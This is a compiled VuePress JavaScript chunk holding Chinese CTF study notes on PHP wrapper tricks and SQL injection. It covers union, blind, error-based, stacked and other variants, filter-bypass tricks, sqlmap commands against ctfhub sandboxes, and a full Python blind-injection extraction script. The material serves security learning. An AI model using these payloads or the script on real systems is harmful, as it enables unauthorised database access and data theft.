import{_ as p,V as o,W as l,X as s,Y as n,$ as t,a0 as a,y as c}from"./framework.11bf0923.js";const i={},u=a(`<h1 id="零零散散的知识点" tabindex="-1"><a class="header-anchor" href="#零零散散的知识点" aria-hidden="true">#</a> 零零散散的知识点</h1><h2 id="php伪协议" tabindex="-1"><a class="header-anchor" href="#php伪协议" aria-hidden="true">#</a> PHP伪协议</h2><ol><li><code>php://filter/read=convert.base64-encode/resource=xxx.php</code>。include回显，读取php文件内容。</li><li><code>php://input</code>。file_get_contents用于读取文件内容，<code>php://input</code>可以接受post参数并被file_get_contents读取。</li></ol><h2 id="linux命令" tabindex="-1"><a class="header-anchor" href="#linux命令" aria-hidden="true">#</a> Linux命令</h2><ul><li><code>&amp;&amp;</code>用于拼接多个Linux命令。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">ls</span> <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> xxx <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span> <span class="token parameter variable">-l</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="php" tabindex="-1"><a class="header-anchor" href="#php" aria-hidden="true">#</a> PHP</h2><div class="custom-container info"><p class="custom-container-title">相关信息</p><ol><li>strstr()区分大小写，可以利用大写或者小写绕过</li></ol></div><h2 id="特殊字符" tabindex="-1"><a class="header-anchor" href="#特殊字符" aria-hidden="true">#</a> 特殊字符</h2>`,9),r={href:"http://www.fhdq.net/",target:"_blank",rel:"noopener noreferrer"},d=a(`<h2 id="二次注入" tabindex="-1"><a class="header-anchor" href="#二次注入" aria-hidden="true">#</a> 二次注入</h2><p>在注册时可能会存在二次注入，一般在用户名上注入</p><h2 id="sql注入" tabindex="-1"><a class="header-anchor" href="#sql注入" aria-hidden="true">#</a> sql注入</h2><ul><li>union注入攻击</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>boolean注入攻击</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">&#39;
id&#39;</span> <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">1</span><span class="token comment">--+</span>

sqlmap
sqlmap <span class="token operator">-</span>u http:<span class="token comment">//challenge-00cfdd6ec4589579.sandbox.ctfhub.com:10800/?id=123 --dbs</span>

sqlmap <span class="token operator">-</span>u http:<span class="token comment">//challenge-00cfdd6ec4589579.sandbox.ctfhub.com:10800/?id=123 -D sqli --tables</span>

sqlmap <span class="token operator">-</span>u http:<span class="token comment">//challenge-00cfdd6ec4589579.sandbox.ctfhub.com:10800/?id=123 -D sqli -T flag --columns</span>

sqlmap <span class="token operator">-</span>u http:<span class="token comment">//challenge-00cfdd6ec4589579.sandbox.ctfhub.com:10800/?id=123 -D sqli -T flag -C flag --dump</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
 
<span class="token keyword">def</span> <span class="token function">database_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    count <span class="token operator">=</span> <span class="token number">0</span>
    database_name <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        url_data_length <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f&#39;1 and length(database())&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_data_length<span class="token punctuation">)</span>
        count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">if</span> mark_false <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> count<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> j <span class="token keyword">in</span> dict_name<span class="token punctuation">:</span>
                    url_data_name <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f&#39;1 and substr(database(),</span><span class="token interpolation"><span class="token punctuation">{</span>k<span class="token punctuation">}</span></span><span class="token string">,1)=\\&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>j<span class="token punctuation">}</span></span><span class="token string">\\&#39;&#39;</span></span>
                    <span class="token comment"># print(url_data_name)</span>
                    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_data_name<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> mark_true <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                        database_name <span class="token operator">=</span> database_name <span class="token operator">+</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;数据库名：&#39;</span> <span class="token operator">+</span> database_name<span class="token punctuation">)</span>
            <span class="token keyword">return</span> database_name
            <span class="token keyword">break</span>
 
<span class="token keyword">def</span> <span class="token function">database_tables</span><span class="token punctuation">(</span>database_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    tables_name <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> table_number <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        table_name <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> word <span class="token keyword">in</span> dict_name<span class="token punctuation">:</span>
                url_table <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f&#39;1 and substr((select table_name from information_schema.tables where table_schema= \\&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>database_name<span class="token punctuation">}</span></span><span class="token string">\\&#39; limit </span><span class="token interpolation"><span class="token punctuation">{</span>table_number<span class="token punctuation">}</span></span><span class="token string">,1),</span><span class="token interpolation"><span class="token punctuation">{</span>k<span class="token punctuation">}</span></span><span class="token string">,1)=\\&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>word<span class="token punctuation">}</span></span><span class="token string">\\&#39;&#39;</span></span>
                <span class="token comment"># print(payload_3)</span>
                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_table<span class="token punctuation">)</span>
                <span class="token keyword">if</span> mark_true <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                    table_name <span class="token operator">=</span> table_name <span class="token operator">+</span> word
        <span class="token keyword">if</span> table_name <span class="token operator">!=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;表名：&#39;</span> <span class="token operator">+</span> table_name<span class="token punctuation">)</span>
            tables_name<span class="token punctuation">.</span>append<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>
    <span class="token keyword">return</span> tables_name
 
<span class="token keyword">def</span> <span class="token function">column_name</span><span class="token punctuation">(</span>tables_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    columns_name <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> table_name <span class="token keyword">in</span> tables_name<span class="token punctuation">:</span>
        <span class="token comment"># print(table_name)</span>
        <span class="token keyword">for</span> column_number <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            column_name <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
            <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> word <span class="token keyword">in</span> dict_name<span class="token punctuation">:</span>
                    url_column <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f&#39;1 and substr((select column_name from information_schema.columns where table_name= \\&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>table_name<span class="token punctuation">}</span></span><span class="token string">\\&#39; limit </span><span class="token interpolation"><span class="token punctuation">{</span>column_number<span class="token punctuation">}</span></span><span class="token string">,1),</span><span class="token interpolation"><span class="token punctuation">{</span>k<span class="token punctuation">}</span></span><span class="token string">,1)=\\&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>word<span class="token punctuation">}</span></span><span class="token string">\\&#39;&#39;</span></span>
                    <span class="token comment"># print(payload_3)</span>
                    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_column<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> mark_true <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                        column_name <span class="token operator">=</span> column_name <span class="token operator">+</span> word
            <span class="token keyword">if</span> column_name <span class="token operator">!=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>table_name<span class="token punctuation">}</span></span><span class="token string">表字段名：&#39;</span></span> <span class="token operator">+</span> column_name<span class="token punctuation">)</span>
                columns_name<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>table_name<span class="token punctuation">,</span> column_name<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> columns_name
 
<span class="token keyword">def</span> <span class="token function">flag_data</span><span class="token punctuation">(</span>columns_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># print(columns_name)</span>
    <span class="token keyword">for</span> column_name <span class="token keyword">in</span> columns_name<span class="token punctuation">:</span>
        flag <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
        <span class="token keyword">for</span> column_number <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> flag_number <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> word <span class="token keyword">in</span> dict_flag<span class="token punctuation">:</span>
                    <span class="token comment"># print(column_name[0], column_name[1])</span>
                    url_flag <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f&#39;1 and substr((select </span><span class="token interpolation"><span class="token punctuation">{</span>column_name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string"> from </span><span class="token interpolation"><span class="token punctuation">{</span>column_name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string"> ),</span><span class="token interpolation"><span class="token punctuation">{</span>flag_number<span class="token punctuation">}</span></span><span class="token string">,1)=\\&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>word<span class="token punctuation">}</span></span><span class="token string">\\&#39;&#39;</span></span>
                    <span class="token comment"># print(url_flag)</span>
                    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_flag<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> mark_true <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                        flag <span class="token operator">=</span> flag <span class="token operator">+</span> word
            <span class="token keyword">print</span><span class="token punctuation">(</span>column_name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">&#39;:&#39;</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>
            <span class="token comment"># break</span>
 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    url <span class="token operator">=</span> <span class="token string">&#39;http://challenge-4628615c0a2a2d50.sandbox.ctfhub.com:10800/?id=&#39;</span>
    mark_true <span class="token operator">=</span> <span class="token string">&#39;query_success&#39;</span>
    mark_false <span class="token operator">=</span> <span class="token string">&#39;query_error&#39;</span>
    dict_name <span class="token operator">=</span> <span class="token string">&#39;qwertyuiopasdfghjklzxcvbnm&#39;</span>
    dict_flag <span class="token operator">=</span> <span class="token string">&#39;qwertyuiopasdfghjklzxcvbnm{}1234567890&#39;</span>
    database_name <span class="token operator">=</span> database_name<span class="token punctuation">(</span><span class="token punctuation">)</span>
    tables_name <span class="token operator">=</span> database_tables<span class="token punctuation">(</span>database_name<span class="token punctuation">)</span>
    columns_name <span class="token operator">=</span> column_name<span class="token punctuation">(</span>tables_name<span class="token punctuation">)</span>
    flag <span class="token operator">=</span> flag_data<span class="token punctuation">(</span>columns_name<span class="token punctuation">)</span>
    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;运行时间为：&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>报错注入攻击</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>username<span class="token operator">=</span><span class="token string">&#39; and updatexml(1, concat(0x7e,select user(),0x7e),1)--+
1 and (select extractvalue(1, concat(0x7e, (select database()))))
1 and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= &#39;</span>sqli<span class="token string">&#39;))))


报错数据库名
1 and (select extractvalue(1, concat(0x7e, (select database()))))
报错表名
1 and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= &#39;</span>sqli<span class="token string">&#39;))))

admin&#39;</span><span class="token operator">or</span><span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token punctuation">)</span><span class="token operator">like</span><span class="token punctuation">(</span><span class="token string">&#39;geek&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span>

报错列名
<span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span> <span class="token string">&#39;flag&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
报错内容
<span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>时间注入攻击</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>堆叠查询注入攻击</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">&#39;;if(substr(user(), 1, 1)=&#39;</span>r<span class="token string">&#39;,sleep(3),1)--+
show tables; 显示表名
show databases; 显示数据库名
desc 表名; 显示字段详情
1&#39;</span><span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span> words <span class="token keyword">rename</span> aaa<span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span> <span class="token identifier"><span class="token punctuation">\`</span>1919810931114514<span class="token punctuation">\`</span></span> change flag id <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span> <span class="token identifier"><span class="token punctuation">\`</span>1919810931114514<span class="token punctuation">\`</span></span> <span class="token keyword">rename</span> words<span class="token punctuation">;</span><span class="token comment">#</span>
将words表重命名为aaa表，再将flag字段改为id字段，最后将aaa表重命名为words表
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>二次注入攻击</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>注册用户名username&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>宽字节注入攻击</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>df&#39;<span class="token comment">--+</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>cookie注入攻击</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>base64注入攻击</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>id<span class="token operator">=</span>MQ<span class="token operator">=</span><span class="token operator">=</span>
id<span class="token operator">=</span>MSc<span class="token operator">=</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>xff注入攻击</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>x<span class="token operator">-</span>forwarded<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">=</span><span class="token number">1.1</span><span class="token number">.1</span><span class="token number">.1</span>&#39; <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">--+</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>UA注入</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python sqlmap.py -u url --level 3 --dbs
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>空格绕过</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>两个空格代替一个空格，用Tab代替空格，<span class="token operator">%</span>a0<span class="token operator">=</span>空格<span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">20</span> <span class="token operator">%</span><span class="token number">09</span> <span class="token operator">%</span><span class="token number">0</span>a <span class="token operator">%</span><span class="token number">0</span>b <span class="token operator">%</span><span class="token number">0</span>c <span class="token operator">%</span><span class="token number">0</span>d <span class="token operator">%</span>a0 <span class="token operator">%</span><span class="token number">00</span> <span class="token comment">/**/</span>  <span class="token comment">/*!*/</span>
括号绕过空格：<span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span> dual <span class="token keyword">where</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">and</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>引号绕过</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> column_name  <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">&quot;users&quot;</span> <span class="token comment"># 等价于</span>
<span class="token keyword">select</span> column_name  <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token number">0x7573657273</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>逗号绕过</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
使用<span class="token keyword">join</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>     <span class="token comment">#等价于</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b
使用<span class="token operator">like</span>
<span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">80</span>   <span class="token comment">#等价于</span>
<span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">&#39;r%&#39;</span>
使用<span class="token keyword">limit</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>
<span class="token comment"># 等价于下面这条SQL语句</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">0</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>or and xor not绕过</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token operator">and</span><span class="token operator">=</span><span class="token operator">&amp;&amp;</span>  <span class="token operator">or</span><span class="token operator">=</span><span class="token operator">||</span>   <span class="token operator">xor</span><span class="token operator">=</span><span class="token operator">|</span>   <span class="token operator">not</span><span class="token operator">=</span><span class="token operator">!</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>绕过union，select，where等</li></ul><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>（<span class="token number">1</span>）使用注释符绕过
常用注释符：<span class="token comment">//，-- , /**/, #, --+, -- -, ;,%00,--a</span>
用法：U<span class="token comment">/**/</span> NION <span class="token comment">/**/</span> SE<span class="token comment">/**/</span> LECT <span class="token comment">/**/</span><span class="token keyword">user</span>，pwd <span class="token keyword">from</span> <span class="token keyword">user</span>
（<span class="token number">2</span>）使用大小写绕过：
id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">&#39;UnIoN/**/SeLeCT
（3）内联注释绕过：
id=-1&#39;</span><span class="token comment">/*!UnIoN*/</span> <span class="token keyword">SeLeCT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token comment">/*!table_name*/</span><span class="token punctuation">)</span> <span class="token keyword">FrOM</span> <span class="token comment">/*information_schema*/</span><span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token comment">/*!WHERE */</span><span class="token comment">/*!TaBlE_ScHeMa*/</span> <span class="token operator">like</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
